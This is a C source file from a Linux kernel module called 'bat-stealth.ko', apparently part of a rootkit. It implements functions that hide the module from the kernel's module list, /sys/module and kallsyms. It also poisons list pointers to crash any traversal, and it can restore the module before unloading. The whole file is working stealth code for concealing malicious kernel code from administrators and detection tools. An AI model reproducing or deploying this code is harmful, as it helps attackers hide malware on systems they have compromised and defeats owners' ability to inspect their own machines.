/* hide_module.c   Remove bat-stealth.ko from all kernel module lists.
 *
 * module_hide_current():
 *   1. Saves list.prev AND list.next (extended from Singularity which only saved prev)
 *   2. Poisons list pointers to prevent traversal
 *   3. Removes kobject from /sys/module
 *   4. Clears sect_attrs (does NOT set MODULE_STATE_UNFORMED   would break K-99)
 *   5. Zeros kallsyms num_symtab
 *
 * module_unhide():
 *   Restores the module to the live list and re-registers kobject in /sys/module.
 *   Required before delete_module() can find the module by name (K-99 Phase 1).
 *   K-99 Phase 2 calls delete_module syscall directly with O_TRUNC (bypasses libkmod).
 *
 * MUST be the last module to init   called directly from main.c
 * after all other hooks are installed.
 */
#include "../include/hide_module.h"
#include "../include/core.h"

static struct module_hider_state hider_state = {0};

/*  sysfs / kobject removal                                       */

static void __remove_from_sysfs(struct module *mod)
{
    struct kobject *kobj = &mod->mkobj.kobj;

    if (kobj && kobj->parent) {
        hider_state.saved_kset        = kobj->kset;
        hider_state.saved_parent      = kobj->parent;
        hider_state.saved_holders_dir = mod->holders_dir;

        kobject_del(kobj);
        kobj->parent = NULL;
        kobj->kset   = NULL;

        if (mod->holders_dir) {
            kobject_put(mod->holders_dir);
            mod->holders_dir = NULL;
        }
    }
}

/*  module list removal                                           */

static void __remove_from_module_list(struct module *mod)
{
    if (!list_empty(&mod->list)) {
        /* Save both prev and next before poisoning */
        hider_state.saved_prev = mod->list.prev;
        hider_state.saved_next = mod->list.next;

        list_del_init(&mod->list);

        /* Poison to crash any attempt to traverse through us */
        mod->list.prev = (struct list_head *)0x37373731;
        mod->list.next = (struct list_head *)0x22373717;
    }
}

static void __sanitize_module_info(struct module *mod)
{
    /* Do NOT change mod->state   setting UNFORMED breaks delete_module()
     * which checks state == MODULE_STATE_LIVE before proceeding (K-99 bug).
     * Hiding is achieved by list removal + kobject_del; state is irrelevant. */
    mod->sect_attrs = NULL;
}

static void __remove_symbols_from_kallsyms(struct module *mod)
{
    if (mod->kallsyms)
        mod->kallsyms->num_symtab = 0;
}

/*  Public API                                                    */

notrace void module_hide_current(void)
{
    struct module *mod = THIS_MODULE;

    if (hider_state.hidden)
        return;

    __remove_from_sysfs(mod);
    __remove_from_module_list(mod);
    __sanitize_module_info(mod);
    __remove_symbols_from_kallsyms(mod);

    hider_state.hidden = true;
}

notrace void module_unhide(void)
{
    struct module *mod = THIS_MODULE;
    struct kobject *kobj = &mod->mkobj.kobj;

    if (!hider_state.hidden)
        return;

    /*  Restore module list                                       */
    if (hider_state.saved_prev && hider_state.saved_next) {
        mod->list.prev = hider_state.saved_prev;
        mod->list.next = hider_state.saved_next;

        /* Relink: insert between saved_prev and saved_next */
        hider_state.saved_prev->next = &mod->list;
        hider_state.saved_next->prev = &mod->list;

        hider_state.saved_prev = NULL;
        hider_state.saved_next = NULL;
    }

    /*  Restore kobject in /sys/module                            */
    if (hider_state.saved_parent) {
        kobj->parent = hider_state.saved_parent;
        kobj->kset   = hider_state.saved_kset;

        /* kobject_add is the reverse of kobject_del */
        if (kobject_add(kobj, hider_state.saved_parent, "%s", mod->name) != 0) {
            /* If sysfs re-add fails, at least the list is restored  
             * delete_module() can still find it by name. */
            kobj->parent = NULL;
        }

        /* holders_dir was freed by kobject_put in __remove_from_sysfs;
         * do not restore a dangling pointer. libkmod needs /sys/module/<name>/holders
         * but K-99 Phase 2 uses delete_module syscall directly (bypasses libkmod). */
        hider_state.saved_holders_dir = NULL;

        hider_state.saved_parent = NULL;
        hider_state.saved_kset   = NULL;
    }

    hider_state.hidden = false;
}

notrace bool module_is_hidden(void)
{
    return hider_state.hidden;
}

/* Exported so sysfs_iface.c weak stub can be overridden */
EXPORT_SYMBOL(module_unhide);
